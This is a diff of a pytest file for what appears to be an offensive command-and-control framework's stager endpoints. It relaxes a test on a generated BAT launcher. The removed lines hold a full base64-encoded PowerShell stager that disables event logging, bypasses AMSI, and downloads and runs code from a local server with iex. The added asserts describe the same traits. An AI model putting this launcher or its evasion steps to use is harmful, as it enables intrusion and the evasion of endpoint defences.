@@ -1,4 +1,5 @@
-from textwrap import dedent
+import base64
+import re
 
 import pytest
 from starlette import status
@@ -635,7 +636,27 @@ def test_bat_stager_creation(client, admin_auth_header):
 
     # Check if the downloaded file is not empty
     assert len(response.content) > 0
-    assert response.content.decode("utf-8") == _expected_http_bat_launcher()
+
+    bat_text = response.content.decode("utf-8")
+    assert "@echo off" in bat_text
+    assert "start /B powershell -noP -sta -w 1 -enc" in bat_text
+    assert "timeout /t 1 > nul" in bat_text
+    assert 'del "%~f0"' in bat_text
+
+    # Validate the encoded payload without pinning it to an exact value.
+    m = re.search(r"-enc\s+([A-Za-z0-9+/=]+)", bat_text)
+    assert m, f"Expected a base64 payload after -enc. BAT was: {bat_text}"
+
+    encoded = m.group(1)
+    raw = base64.b64decode(encoded, validate=True)
+    ps = raw.decode("utf-16le", errors="strict")
+
+    # Stable invariants inside the launcher
+    assert "System.Net.WebClient" in ps
+    assert "Headers.Add" in ps
+    assert "Cookie" in ps
+    assert "DownloadData" in ps
+    assert "IEX" in ps or "Invoke-Expression" in ps
 
     client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)
 
@@ -698,17 +719,6 @@ def test_macro_stager_generation(
     assert expected_trigger in response.content.decode("utf-8")
 
     client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)
-
-
-def _expected_http_bat_launcher():
-    return dedent(
-        """
-        @echo off
-        start /B powershell.exe -nop -ep bypass -w 1 -enc WwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAEUAdgBlAG4AdABpAG4AZwAuAEUAdgBlAG4AdABQAHIAbwB2AGkAZABlAHIAXQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAbQBfAGUAbgBhAGIAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABJAG4AcwB0AGEAbgBjAGUAJwApAC4AUwBlAHQAVgBhAGwAdQBlACgAWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFQAcgBhAGMAaQBuAGcALgBQAFMARQB0AHcATABvAGcAUAByAG8AdgBpAGQAZQByACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAZQB0AHcAUAByAG8AdgBpAGQAZQByACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4ARwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACkALAAwACkAOwAkAFIAZQBmAD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAdABGAGkAZQBsAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AHYAYQBsAHUAZQAoACQATgB1AGwAbAAsACQAdAByAHUAZQApADsAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwBpAHcAcgAoACcAaAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA6ADEAMwAzADYALwBkAG8AdwBuAGwAbwBhAGQALwBwAG8AdwBlAHIAcwBoAGUAbABsAC8AJwApAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAfABpAGUAeAA=
-        timeout /t 1 > nul
-        del "%~f0"
-        """
-    ).strip()
 
 
 def test_csharp_stager_creation(client, admin_auth_header):
